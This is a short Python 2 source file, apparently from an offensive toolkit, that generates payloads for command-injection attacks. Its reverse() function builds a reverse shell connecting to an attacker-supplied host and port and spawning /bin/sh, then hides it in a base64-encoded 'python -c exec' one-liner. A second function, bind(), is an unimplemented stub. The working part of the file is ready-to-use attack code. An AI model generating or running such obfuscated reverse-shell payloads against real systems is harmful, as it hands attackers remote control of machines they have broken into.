#!/usr/bin/python
"""This module simply is a payload generator. It produces payloads in python"""

def reverse(lhost, lport):
    """This function generates a python reverse shell to use while exploiting command injection vulnerabilities"""
    shellcode = """import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('%s',%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(['/bin/sh','-i']);""" %(lhost, lport)
    encoded = shellcode.encode('base64')
    encoded = encoded.strip()
    encoded = encoded.replace('\n', '')
    wrapper =  """python -c "exec('""" + encoded + """'.decode('base64'))";"""
    payload = wrapper
    return payload

def bind():
    """This function will generate a python bind shell payload once I bother writing it"""
    print "Not Implemented!"
    pass


